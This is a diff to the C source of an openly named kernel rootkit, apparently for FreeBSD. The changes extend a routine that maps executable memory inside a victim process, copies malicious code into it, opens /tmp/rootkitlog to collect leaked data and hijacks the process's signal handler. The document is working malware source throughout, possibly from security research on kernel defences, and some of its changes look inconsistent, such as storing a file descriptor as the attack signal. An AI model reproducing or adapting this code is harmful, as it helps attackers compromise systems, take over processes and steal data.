@@ -28,6 +28,7 @@
 #include <sys/syscall.h>
 #include <sys/sysproto.h>
 #include <sys/sx.h>
+#include <sys/uio.h>
 
 #include "rootkit/rootkit.h"
 #include "rootkit/rkconfig.h"
@@ -41,7 +42,7 @@
 //
 
 // Signal to use for the attack
-static const int attackSig = SIGUSR1;
+static int attackSig = SIGUSR1;
 
 // Target process to attack
 struct proc * victimProc = 0;
@@ -79,13 +80,30 @@ isVictimThread (struct thread * td) {
   return 0;
 }
 
+//
+// Function: insertMaliciousCode()
+//
+// Description:
+//  Insert malicious code into the user-space program.  This function also
+//  creates a log file to which the leaked data will be written.
+//
+// Inputs:
+//  td - The thread into which to insert malicious code.
+//
+// Outputs:
+//  fd - A pointer to the file descriptor which will refer to the log file.
+//
 static void *
-insertMaliciousCode (struct thread * td) {
+insertMaliciousCode (struct thread * td, int * fd) {
   //
   // Allocate some memory within the victim process.
   //
   int error;
   struct mmap_args args;
+
+  // Pointer to the user-space memory buffer
+  char * memp = 0;
+
   args.addr = 0;
   args.len = 4096;
   args.prot = PROT_READ | PROT_WRITE | PROT_EXEC;
@@ -94,6 +112,14 @@ insertMaliciousCode (struct thread * td) {
   args.pos = 0;
   error = sys_mmap (td, &args);
   printf ("Rootkit: error = %d: memory at %lx\n", error, td->td_retval[0]);
+  memp = td->td_retval[0];
+
+  //
+  // Get the process to open up a log file.
+  //
+  kern_open (td, "/tmp/rootkitlog", UIO_SYSSPACE, O_WRONLY | O_CREAT, 0777);
+  *fd = td->td_retval[0];
+  printf ("Rootkit: Opened %s: %d\n", memp, fd);
 
   //
   // Install malicious code into the allocated memory.
@@ -101,14 +127,14 @@ insertMaliciousCode (struct thread * td) {
   extern unsigned char badcode;
   extern unsigned char endcode;
   printf ("Rootkit: 1: copyout: %p %p %lx\n", badcode, td->td_retval[0], &endcode - &badcode);
-  error = copyout (&badcode, td->td_retval[0], &endcode - &badcode); 
+  error = copyout (&badcode, memp, &endcode - &badcode); 
   printf ("Rootkit: 2: copyout: %d: %p %p %lx\n", error, &badcode, td->td_retval[0], &endcode - &badcode);
 
   //
   // Mark that we've inserted the malicious code.
   //
   injected = 1;
-  return td->td_retval[0];
+  return memp;
 }
 
 //
@@ -187,8 +213,10 @@ doAttack (struct thread * td) {
 
     // Signal handler attack
     case at_sig: {
+      int fd; 
       printf ("Rootkit: doAttack: Signal Attack\n");
-      void * handler = insertMaliciousCode (td);
+      void * handler = insertMaliciousCode (td, &fd);
+      attackSig = fd;
       setMaliciousHandler (td, handler);
       attackThread (td);
       break;
